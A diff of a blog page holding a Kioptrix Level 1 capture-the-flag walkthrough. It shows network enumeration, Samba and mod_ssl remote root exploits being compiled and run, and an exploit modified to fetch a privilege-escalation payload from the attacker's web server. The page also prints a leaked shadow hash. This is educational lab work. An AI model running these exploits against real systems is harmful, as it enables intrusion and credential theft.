@@ -20,7 +20,7 @@
     <meta property="og:url" content="http://localhost:2368/kioptrix-walkthrough-1/">
     <meta property="og:image" content="http://localhost:2368/content/images/2018/07/Kioptrix-1-Cover.jpg">
     <meta property="article:published_time" content="2017-08-16T05:24:00.000Z">
-    <meta property="article:modified_time" content="2018-07-30T07:12:37.000Z">
+    <meta property="article:modified_time" content="2018-07-30T08:01:35.000Z">
     <meta property="article:tag" content="Boot2Root">
     <meta property="article:tag" content="VulnHub">
     <meta property="article:tag" content="OSCP">
@@ -47,12 +47,7 @@
     "publisher": {
         "@type": "Organization",
         "name": "rootshellz",
-        "logo": {
-            "@type": "ImageObject",
-            "url": "http://localhost:2368/favicon.ico",
-            "width": 60,
-            "height": 60
-        }
+        "logo": "http://localhost:2368/content/images/2018/07/Blog-Logo.png"
     },
     "author": {
         "@type": "Person",
@@ -71,7 +66,7 @@
     "headline": "Kioptrix: Level 1 (#1) Walkthrough",
     "url": "http://localhost:2368/kioptrix-walkthrough-1/",
     "datePublished": "2017-08-16T05:24:00.000Z",
-    "dateModified": "2018-07-30T07:12:37.000Z",
+    "dateModified": "2018-07-30T08:01:35.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "http://localhost:2368/content/images/2018/07/Kioptrix-1-Cover.jpg",
@@ -131,10 +126,10 @@
 <h1 id="scanningandenumeration">Scanning and Enumeration</h1>
 <h2 id="identifyingtargetaddressdhcp">Identifying Target Address (DHCP)</h2>
 <p>The host grabs an address via DHCP as it boots.  Identifying the host on my network was simple as the VM is in a low traffic local subnet on my host machine.</p>
-<pre><code>root@kali:~# ifconfig eth1 | grep "inet\s"
+<pre><code class="language-shell-output">root@kali:~# ifconfig eth1 | grep "inet\s"
 inet 172.16.2.129  netmask 255.255.255.0  broadcast 172.16.2.255
 </code></pre>
-<pre><code>root@kali:~# nmap -T4 -sn 172.16.2.0/24
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -sn 172.16.2.0/24
 
 Starting Nmap 7.25BETA2 ( https://nmap.org )
 Nmap scan report for 172.16.2.1
@@ -153,7 +148,7 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 13.11 seconds
 <p>The scan shows only four live IPs on my target subnet (172.16.2.0/24): the gateway (.1), DHCP server (.254), my Kali machine (.129), and the target, Kioptrix1, which has been assigned 172.16.2.130.</p>
 <h2 id="enumerateallthethings">Enumerate All the things</h2>
 <h3 id="nmap">nmap</h3>
-<pre><code>root@kali:~# nmap -T4 -Pn -sV -O -p- 172.16.2.130
+<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sV -O -p- 172.16.2.130
 
 Starting Nmap 7.25BETA2 ( https://nmap.org )
 Nmap scan report for 172.16.2.130
@@ -211,7 +206,7 @@ Nmap done: 1 IP address (1 host up) scanned in 144.28 seconds
 <p>There is plenty going on here, so I started by running the OpenSSH, Apache, mod_ssl, and OpenSSL versions through <a href="https://www.exploit-db.com/">Exploit DB</a>.  There were some decent matches, but I wanted to dig in to the SMB service first.  Usually when SMB fails, it fails hard...</p>
 <h1 id="exploitation1smb">Exploitation #1 - SMB</h1>
 <p>I wanted to get more info on the netbios service (on 139/tcp) at least get a version.</p>
-<pre><code>root@kali:~# enum4linux 172.16.2.130
+<pre><code class="language-shell-output">root@kali:~# enum4linux 172.16.2.130
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ )
 
 [... snip ...]
@@ -221,22 +216,22 @@ Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux
  ====================================== 
 [+] Got OS info for 172.16.2.130 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
 [+] Got OS info for 172.16.2.130 from srvinfo:
-	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
-	platform_id     :	500
-	os version      :	4.5
-	server type     :	0x9a03
+  KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
+  platform_id     : 500
+  os version      : 4.5
+  server type     : 0x9a03
 
 [... snip ...]
 
 enum4linux complete on Fri Aug 11 22:42:00 2017
 </code></pre>
 <p>Ahh, there's the version: Samba <em>2.2.1a</em>, which I then ran through Exploit DB:</p>
-<pre><code>root@kali:~# searchsploit Samba | grep "2\.2\."
+<pre><code class="language-shell-output">root@kali:~# searchsploit Samba | grep "2\.2\."
 Samba 2.2.x - Remote Root Buffer Overflow                            | ./linux/remote/7.pl
 [... snip ...]
 </code></pre>
 <p>This looked promising, so I attempted the exploit:</p>
-<pre><code>root@kali:~# perl /usr/share/exploitdb/platforms/linux/remote/7.pl
+<pre><code class="language-shell-output">root@kali:~# perl /usr/share/exploitdb/platforms/linux/remote/7.pl
 
  trans2root.pl - Samba 2.2.x 'trans2open()' Remote Exploit
 ===================================
@@ -253,7 +248,7 @@ Samba 2.2.x - Remote Root Buffer Overflow                            | ./linux/r
             solx86
             fbsdx86
 </code></pre>
-<pre><code>root@kali:~# perl /usr/share/exploitdb/platforms/linux/remote/7.pl -t linx86 -H 172.16.2.129 -h 172.16.2.130
+<pre><code class="language-shell-output">root@kali:~# perl /usr/share/exploitdb/platforms/linux/remote/7.pl -t linx86 -H 172.16.2.129 -h 172.16.2.130
 [*] Using target type: linx86
 [*] Listener started on port 1981
 [*] Starting brute force mode...
@@ -265,18 +260,18 @@ root@kali:~#
 <p></p>
 <p>As a side note, this exploit labeling makes it difficult to identify this exploit with the searchsploit tool.  If anyone know how to better use searchsploit, let me know.</p>
 <p>At any rate, I located, compiled, and ran the exploit:</p>
-<pre><code>root@kali:~# searchsploit "Samba 2.2.8"
+<pre><code class="language-shell-output">root@kali:~# searchsploit "Samba 2.2.8"
 ------------------------------------------------------------------------------------------------------------------- ----------------------------------
  Exploit Title                                                                                                     |  Path
                                                                                                                    | (/usr/share/exploitdb/platforms)
 ------------------------------------------------------------------------------------------------------------------- ----------------------------------
 Samba 2.2.8 - Remote Root Exploit                                                                                  | ./linux/remote/10.c
 </code></pre>
-<pre><code>root@kali:~# gcc -o sambasploit /usr/share/exploitdb/platforms/linux/remote/10.c 
+<pre><code class="language-shell-output">root@kali:~# gcc -o sambasploit /usr/share/exploitdb/platforms/linux/remote/10.c 
 root@kali:~# file sambasploit 
 sambasploit: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3209817b6f2b2e5f713e16f8e55dcf0fbb219feb, not stripped
 </code></pre>
-<pre><code>root@kali:~# ./sambasploit 
+<pre><code class="language-shell-output">root@kali:~# ./sambasploit 
 samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
 --------------------------------------------------------------
 Usage: ./sambasploit [-bBcCdfprsStv] [host]
@@ -294,7 +289,7 @@ Usage: ./sambasploit [-bBcCdfprsStv] [host]
 -t &lt;type&gt;       presets (0 for a list)
 -v              verbose mode
 </code></pre>
-<pre><code>root@kali:~# ./sambasploit -v -b 0 172.16.2.130
+<pre><code class="language-shell-output">root@kali:~# ./sambasploit -v -b 0 172.16.2.130
 samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
 --------------------------------------------------------------
 + Verbose mode.
@@ -316,7 +311,7 @@ root
 <p>Unfamiliar with "JE MOET JE MUIL HOUWE," I found it is Dutch for "YOU MUST HAVE YOUR MOUSE."  It is also, apparently, a <a href="https://www.youtube.com/watch?v=BcpirI2BcWI">hardcore song by Neophyte</a>.  If there is some further reference here, it is lost on me.</p>
 <h1 id="exploitation2apacheandmod_ssl">Exploitation #2 - Apache and mod_ssl</h1>
 <p>Searching for Apache and mod_ssl vulnerabilities / exploits turned up a promising hit:</p>
-<pre><code>root@kali:~# searchsploit apache mod_ssl
+<pre><code class="language-shell-output">root@kali:~# searchsploit apache mod_ssl
 ---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
  Exploit Title                                                                                                                    |  Path
                                                                                                                                   | (/usr/share/exploitdb/platforms)
@@ -325,11 +320,11 @@ Apache/mod_ssl (&lt; 2.8.7) OpenSSL - 'OpenFuckV2.c' Remote Exploit (2)         
 [... snip ...]
 </code></pre>
 <p>I attempted to compile this exploit, using libcrypto, but it failed miserably.  I did some Googling and found an article by <a href="http://paulsec.github.io/">PaulSec</a> about <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">updating this exploit</a> for modern pwning.  PaulSec's modifications worked with two exceptions:  First, I had to change the URL, as suggested by PauSec, but I needed https instead of http (<a href="https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</a>).  Second, on my Kali install, I had to install libssl1.0-dev as opposed to just libssl1-dev.  In fact, this required removing my existing libssl-dev package.  Once all modifications were made to the exploit an my build environment, I was able to compile and use the exploit:</p>
-<pre><code>root@kali:~# gcc -o OpenFuckIn2017 OpenFuckIn2017.c -lcrypto
+<pre><code class="language-shell-output">root@kali:~# gcc -o OpenFuckIn2017 OpenFuckIn2017.c -lcrypto
 root@kali:~# file OpenFuckIn2017
 OpenFuckIn2017: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b6026a5ef5267c1ff4612467c68fe9f24f8449c9, not stripped
 </code></pre>
-<pre><code>root@kali:~# ./OpenFuckIn2017
+<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017
 
 *******************************************************************
 * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
@@ -354,12 +349,12 @@ OpenFuckIn2017: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dyn
 Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
 </code></pre>
 <p>I needed to identify the target to use:</p>
-<pre><code>root@kali:~# ./OpenFuckIn2017 | grep RedHat | grep 1.3.20
-	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
-	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017 | grep RedHat | grep 1.3.20
+  0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+  0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
 </code></pre>
 <p>I attempted the first target without luck:</p>
-<pre><code>root@kali:~# ./OpenFuckIn2017 0x6a 172.16.2.130
+<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017 0x6a 172.16.2.130
 
 *******************************************************************
 * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
@@ -378,7 +373,7 @@ Spawning shell...
 Good Bye!
 </code></pre>
 <p>So I moved on to the second:</p>
-<pre><code>root@kali:~# ./OpenFuckIn2017 0x6b 172.16.2.130
+<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017 0x6b 172.16.2.130
 
 *******************************************************************
 * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
@@ -414,7 +409,7 @@ pwd
 /tmp
 </code></pre>
 <p>Awesome, I received a shell, albeit not root.  This is when I discovered that because I set up Kioptrix1 without Internet access, my initial remote exploit was unable to download the ptrace/kmod local root exploit from packetstormsecurity.net.  I proceeded to stage the privilege escalation exploit locally on my Kali box:</p>
-<pre><code>root@kali:~# wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+<pre><code class="language-shell-output">root@kali:~# wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
 --2017-08-13 10:56:21--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
 Resolving dl.packetstormsecurity.net (dl.packetstormsecurity.net)... 198.84.60.200
 Connecting to dl.packetstormsecurity.net (dl.packetstormsecurity.net)|198.84.60.200|:80... connected.
@@ -431,15 +426,15 @@ ptrace-kmod.c                                        100%[======================
 2017-08-13 10:56:22 (70.1 MB/s) - ‘ptrace-kmod.c’ saved [3921/3921]
 </code></pre>
 <p>I then updated my exploit to download the file from my Kali box, again using the Python Simple HTTP server.</p>
-<pre><code>root@kali:~# cp OpenFuckIn2017.c OpenFuckIn2017LocalDL.c
+<pre><code class="language-shell-output">root@kali:~# cp OpenFuckIn2017.c OpenFuckIn2017LocalDL.c
 root@kali:~# sed -i 's*https://dl.packetstormsecurity.net/0304-exploits/*http://172.16.2.129:8000/*' OpenFuckIn2017LocalDL.c
 root@kali:~# gcc -o OpenFuckIn2017LocalDL OpenFuckIn2017LocalDL.c -lcrypto
 </code></pre>
-<pre><code>root@kali:~# python -m SimpleHTTPServer
+<pre><code class="language-shell-output">root@kali:~# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 172.16.2.130 - - [13/Aug/2017 11:03:20] "GET /ptrace-kmod.c HTTP/1.0" 200 -
 </code></pre>
-<pre><code>root@kali:~# ./OpenFuckIn2017LocalDL 0x6b 172.16.2.130
+<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017LocalDL 0x6b 172.16.2.130
 
 *******************************************************************
 * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
@@ -551,7 +546,7 @@ harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
 <p>I couldn't seem to identify any exact matches of RCE exploits for OpenSSH 2.9p2.  However, every version of SSH is always vulnerable to at least one exploit: brute force!  I didn't spend the time trying to brute force my way in, but it is definitely possible this is a possible solution.</p>
 <h1 id="pillaging">Pillaging</h1>
 <p>Looking through the output of my enumeration script, I noticed something of note:</p>
-<pre><code>ls -l /var/mail/
+<pre><code class="language-shell-output">ls -l /var/mail/
 total 1
 -rw-rw----    1 harold   harold          0 Sep 26  2009 harold
 -rw-rw----    1 john     john            0 Sep 26  2009 john
@@ -559,15 +554,15 @@ total 1
 -rw-------    1 root     root         1005 Aug 16 00:06 root
 </code></pre>
 <p>Mr. root had some mail.</p>
-<pre><code>file /var/mail/root
+<pre><code class="language-shell-output">file /var/mail/root
 /var/mail/root: ASCII mail text
 
 cat /var/mail/root
 From root  Sat Sep 26 11:42:10 2009
 Return-Path: &lt;root@kioptix.level1&gt;
 Received: (from root@localhost)
-	by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
-	for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
+  by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
+  for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
 Date: Sat, 26 Sep 2009 11:42:10 -0400
 From: root &lt;root@kioptix.level1&gt;
 Message-Id: &lt;200909261542.n8QFgAZ01831@kioptix.level1&gt;
@@ -581,8 +576,8 @@ Level 2 won't be as easy...
 From root  Wed Aug 16 00:06:45 2017
 Return-Path: &lt;root@kioptrix.level1&gt;
 Received: (from root@localhost)
-	by kioptrix.level1 (8.11.6/8.11.6) id v7G46js01139
-	for root; Wed, 16 Aug 2017 00:06:45 -0400
+  by kioptrix.level1 (8.11.6/8.11.6) id v7G46js01139
+  for root; Wed, 16 Aug 2017 00:06:45 -0400
 Date: Wed, 16 Aug 2017 00:06:45 -0400
 From: root &lt;root@kioptrix.level1&gt;
 Message-Id: &lt;201708160406.v7G46js01139@kioptrix.level1&gt;
